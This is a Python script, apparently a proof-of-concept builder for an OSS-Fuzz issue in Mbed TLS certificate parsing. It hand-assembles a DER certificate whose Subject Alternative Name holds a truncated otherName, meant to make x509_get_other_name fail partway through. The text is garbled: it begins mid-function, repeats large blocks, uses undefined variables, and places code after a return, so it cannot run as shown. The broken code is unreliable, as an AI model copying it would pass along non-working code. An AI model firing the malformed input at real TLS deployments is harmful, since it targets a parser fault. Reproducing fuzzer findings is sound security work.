x509 certificate parsing (OSS-Fuzz issue 5142637603979264).

    sig_alg.append(0x05)  # NULL
    sig_alg.append(0x00)  # length
    buf.append(0x30)  # SEQUENCE
    buf.append(len(sig_alg))
    buf.extend(sig_alg)

    # Issuer: CN=Test
    issuer = bytearray()
    issuer.append(0x31)  # SET
    issuer.append(0x0b)  # length
    issuer.append(0x30)  # SEQUENCE
    issuer.append(0x09)  # length
    issuer.append(0x06)  # OID
    issuer.append(0x03)  # length
    issuer.extend([0x55, 0x04, 0x03])  # 2.5.4.3
    issuer.append(0x0c)  # UTF8String
    issuer.append(0x04)  # length
    issuer.extend(b"Test")
    buf.append(0x30)  # SEQUENCE
    buf.append(len(issuer))
    buf.extend(issuer)

    validity.append(0x17)  # UTCTime
    validity.append(0x0d)  # length
    validity.extend(b"240101000000Z")
    validity.append(0x17)  # UTCTime
    validity.append(0x0d)  # length
    validity.extend(b"250101000000Z")
    buf.append(0x30)  # SEQUENCE
    buf.append(len(validity))
    buf.extend(validity)

    # Subject: CN=Test
    subject = bytearray()
    subject.append(0x31)  # SET
    subject.append(0x0b)  # length
    subject.append(0x30)  # SEQUENCE
    subject.append(0x09)  # length
    subject.append(0x06)  # OID
    subject.append(0x03)  # length
    subject.extend([0x55, 0x04, 0x03])  # 2.5.4.3
    subject.append(0x0c)  # UTF8String
    subject.append(0x04)  # length
    subject.extend(b"Test")
    buf.append(0x30)  # SEQUENCE
    buf.append(len(subject))
    buf.extend(subject)

    # SubjectPublicKeyInfo: minimal RSA public key
    rsa_pubkey = bytearray()
    rsa_pubkey.append(0x02)  # INTEGER
    rsa_pubkey.append(0x01)  # length
    rsa_pubkey.append(0x03)  # value (modulus = 3)
    rsa_pubkey.append(0x02)  # INTEGER
    rsa_pubkey.append(0x03)  # length

    spki_alg_id.append(0x06)  # OID
    spki_alg_id.append(0x09)  # length
    spki_alg_id.extend([0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x01, 0x01])  # rsaEncryption
    spki_alg_id.append(0x05)  # NULL
    spki_alg_id.append(0x00)  # length

    spki_seq = bytearray()
    spki_seq.append(0x30)  # SEQUENCE
    spki_seq.append(len(spki_alg_id))
    spki_seq.extend(spki_alg_id)

    rsa_pubkey_seq = bytearray()
    rsa_pubkey_seq.append(0x30)  # SEQUENCE
    rsa_pubkey_seq.append(len(rsa_pubkey))
    rsa_pubkey_seq.extend(rsa_pubkey)

    bit_string = bytearray()
    bit_string.append(0x03)  # BIT STRING
    bit_string.append(len(rsa_pubkey_seq) + 1)
    bit_string.append(0x00)  # 0 unused bits
    bit_string.extend(rsa_pubkey_seq)

    spki.append(0x30)  # SEQUENCE
    spki.append(len(spki_seq) + len(bit_string))
    spki.extend(spki_seq)
    spki.extend(bit_string)

    buf.append(len(spki))

    san_entries.append(0x82)  # [2] (context-specific, primitive, tag 2)
    san_entries.append(0x0b)  # length
    san_entries.extend(b"example.com")

    # We provide the OID correctly, but then provide a truncated/malformed value
    # that will cause x509_get_other_name to fail with INVALID_EXTENSIONS error
    
    other_name_inner = bytearray()
    # OID for HW_MODULE_NAME
    other_name_inner.append(0x06)  # OID tag
    other_name_inner.append(0x08)  # length
    other_name_inner.extend([0x2b, 0x06, 0x01, 0x05, 0x05, 0x07, 0x08, 0x04])  # 1.3.6.1.5.5.7.8.4
    # Now we need a [0] EXPLICIT tag with content that will fail
    # Provide a truncated SEQUENCE that will cause ASN1 parse error
    other_name_inner.append(0xa0)  # [0] constructed
    other_name_inner.append(0x04)  # length
    other_name_inner.append(0x30)  # SEQUENCE
    other_name_inner.append(0x02)  # length
    other_name_inner.append(0x06)  # OID tag (but truncated - no length byte follows properly)
    # This will cause mbedtls_asn1_get_tag to fail
    
    # Wrap in [0] context-specific tag for otherName
    san_entries.append(0xa0)  # [0] constructed (otherName)
    san_entries.append(len(other_name_inner))
    san_entries.extend(other_name_inner)

    # Wrap in SEQUENCE
    san_value = bytearray()
    san_value.append(0x30)  # SEQUENCE
    san_value.append(len(san_entries))
    san_value.extend(san_entries)

    # Build the full extension
    ext_value = bytearray()
    ext_value.append(0x04)  # OCTET STRING
    ext_value.append(len(san_value))
    ext_value.extend(san_value)

    ext_seq = bytearray()
    ext_seq.append(0x06)  # OID
    ext_seq.append(len(san_oid))
    ext_seq.extend(san_oid)
    ext_seq.extend(ext_value)

    ext_outer = bytearray()
    ext_outer.append(0x30)  # SEQUENCE
    ext_outer.append(len(ext_seq))
    ext_outer.extend(ext_seq)

    # Extensions SEQUENCE
    ext_seq_outer = bytearray()
    ext_seq_outer.append(0x30)  # SEQUENCE
    ext_seq_outer.append(len(ext_outer))
    ext_seq_outer.extend(ext_outer)

    # [3] EXPLICIT wrapper
    ext_explicit = bytearray()
    ext_explicit.append(0xa3)  # [3] constructed
    ext_explicit.append(len(ext_seq_outer))
    ext_explicit.extend(ext_seq_outer)

    buf.extend(ext_explicit)

    return bytes(buf)


def build_certificate():
    """Build a full DER certificate."""
    tbs = build_tbs_certificate()

    cert = bytearray()

    # Outer SEQUENCE
    cert.append(0x30)  # SEQUENCE
    cert.append(0x00)  # placeholder

    # TBSCertificate
    cert.extend(tbs)

    # Signature algorithm (same as in TBS)
    sig_alg = bytearray()
    sig_alg.append(0x06)  # OID
    sig_alg.append(0x09)  # length
    sig_alg.extend([0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x01, 0x0b])
    sig_alg.append(0x05)  # NULL
    sig_alg.append(0x00)  # length
    cert.append(0x30)  # SEQUENCE
    cert.append(len(sig_alg))
    cert.extend(sig_alg)

    cert.append(0x03)  # BIT STRING
    cert.append(0x03)  # length
    cert.append(0x00)  # 0 unused bits
    cert.extend([0x00, 0x01])  # dummy signature

    cert_len = len(cert) - 2
    cert[1] = cert_len

    return bytes(cert)

    poc = build_certificate()
    with open("/workspace/poc.der", "wb") as f:
        f.write(poc)
    print(f"Written {len(poc)} bytes to /workspace/poc.der")
    print(f"Hex: {poc.hex()}")

    buf.append(0x30)  # SEQUENCE
    buf.append(len(subject))
    buf.extend(subject)

    # SubjectPublicKeyInfo: minimal RSA public key
    rsa_pubkey = bytearray()
    rsa_pubkey.append(0x02)  # INTEGER
    rsa_pubkey.append(0x01)  # length
    rsa_pubkey.append(0x03)  # value (modulus = 3)
    rsa_pubkey.append(0x02)  # INTEGER
    rsa_pubkey.append(0x03)  # length
    rsa_pubkey.extend([0x01, 0x00, 0x01])  # 65537

    spki_alg_id = bytearray()
    spki_alg_id.append(0x06)  # OID
    spki_alg_id.append(0x09)  # length
    spki_alg_id.extend([0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x01, 0x01])  # rsaEncryption
    spki_alg_id.append(0x05)  # NULL
    spki_alg_id.append(0x00)  # length

    spki_seq = bytearray()
    spki_seq.append(0x30)  # SEQUENCE
    spki_seq.append(len(spki_alg_id))
    spki_seq.extend(spki_alg_id)

    rsa_pubkey_seq = bytearray()
    rsa_pubkey_seq.append(0x30)  # SEQUENCE
    rsa_pubkey_seq.append(len(rsa_pubkey))
    rsa_pubkey_seq.extend(rsa_pubkey)

    bit_string = bytearray()
    bit_string.append(0x03)  # BIT STRING
    bit_string.append(len(rsa_pubkey_seq) + 1)
    bit_string.append(0x00)  # 0 unused bits
    bit_string.extend(rsa_pubkey_seq)

    spki = bytearray()
    spki.append(0x30)  # SEQUENCE
    spki.append(len(spki_seq) + len(bit_string))
    spki.extend(spki_seq)
    spki.extend(bit_string)

    buf.append(0x30)  # SEQUENCE
    buf.append(len(spki))
    buf.extend(spki)

    # Extensions [3] EXPLICIT
    # Build a Subject Alternative Names extension with:
    # 1. A valid dNSName entry (so cur->next gets allocated)
    # 2. A malformed otherName entry that passes the tag check but fails
    #    in x509_get_other_name with an error other than FEATURE_UNAVAILABLE
    
    # SAN extension OID: 2.5.29.17
    san_oid = bytearray([0x55, 0x1d, 0x11])

    san_entries = bytearray()

    # First entry: valid dNSName [2] "example.com"
    san_entries.append(0x82)  # [2] (context-specific, primitive, tag 2)
    san_entries.append(0x0b)  # length
    san_entries.extend(b"example.com")

    # Second entry: otherName [0] with HW_MODULE_NAME OID but truncated payload
    # otherName ::= SEQUENCE { type-id OID, value [0] EXPLICIT ANY DEFINED BY type-id }
    # HW_MODULE_NAME OID = 1.3.6.1.5.5.7.8.4 = \x2b\x06\x01\x05\x05\x07\x08\x04
    # We provide the OID correctly, but then provide a truncated/malformed value
    # that will cause x509_get_other_name to fail with INVALID_EXTENSIONS error
    
    other_name_inner = bytearray()
    # OID for HW_MODULE_NAME
    other_name_inner.append(0x06)  # OID tag
    other_name_inner.append(0x08)  # length
    other_name_inner.extend([0x2b, 0x06, 0x01, 0x05, 0x05, 0x07, 0x08, 0x04])  # 1.3.6.1.5.5.7.8.4
    # Now we need a [0] EXPLICIT tag with content that will fail
    # Provide a truncated SEQUENCE that will cause ASN1 parse error
    other_name_inner.append(0xa0)  # [0] constructed
    other_name_inner.append(0x04)  # length
    other_name_inner.append(0x30)  # SEQUENCE
    other_name_inner.append(0x02)  # length
    other_name_inner.append(0x06)  # OID tag (but truncated - no length byte follows properly)
    # This will cause mbedtls_asn1_get_tag to fail
    
    # Wrap in [0] context-specific tag for otherName
    san_entries.append(0xa0)  # [0] constructed (otherName)
    san_entries.append(len(other_name_inner))
    san_entries.extend(other_name_inner)

    # Wrap in SEQUENCE
    san_value = bytearray()
    san_value.append(0x30)  # SEQUENCE
    san_value.append(len(san_entries))
    san_value.extend(san_entries)

    # Build the full extension
    ext_value = bytearray()
    ext_value.append(0x04)  # OCTET STRING
    ext_value.append(len(san_value))
    ext_value.extend(san_value)

    ext_seq = bytearray()
    ext_seq.append(0x06)  # OID
    ext_seq.append(len(san_oid))
    ext_seq.extend(san_oid)
    ext_seq.extend(ext_value)

    ext_outer = bytearray()
    ext_outer.append(0x30)  # SEQUENCE
    ext_outer.append(len(ext_seq))
    ext_outer.extend(ext_seq)

    # Extensions SEQUENCE
    ext_seq_outer = bytearray()
    ext_seq_outer.append(0x30)  # SEQUENCE
    ext_seq_outer.append(len(ext_outer))
    ext_seq_outer.extend(ext_outer)

    # [3] EXPLICIT wrapper
    ext_explicit = bytearray()
    ext_explicit.append(0xa3)  # [3] constructed
    ext_explicit.append(len(ext_seq_outer))
    ext_explicit.extend(ext_seq_outer)

    buf.extend(ext_explicit)

    return bytes(buf)


def build_certificate():
    """Build a full DER certificate."""
    tbs = build_tbs_certificate()

    cert = bytearray()

    # Outer SEQUENCE
    cert.append(0x30)  # SEQUENCE
    cert.append(0x00)  # placeholder

    # TBSCertificate
    cert.extend(tbs)

    # Signature algorithm (same as in TBS)
    sig_alg = bytearray()
    sig_alg.append(0x06)  # OID
    sig_alg.append(0x09)  # length
    sig_alg.extend([0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x01, 0x0b])
    sig_alg.append(0x05)  # NULL
    sig_alg.append(0x00)  # length
    cert.append(0x30)  # SEQUENCE
    cert.append(len(sig_alg))
    cert.extend(sig_alg)

    # Signature value: BIT STRING with minimal content
    cert.append(0x03)  # BIT STRING
    cert.append(0x03)  # length
    cert.append(0x00)  # 0 unused bits
    cert.extend([0x00, 0x01])  # dummy signature

    # Fix outer SEQUENCE length
    cert_len = len(cert) - 2
    cert[1] = cert_len

    return bytes(cert)
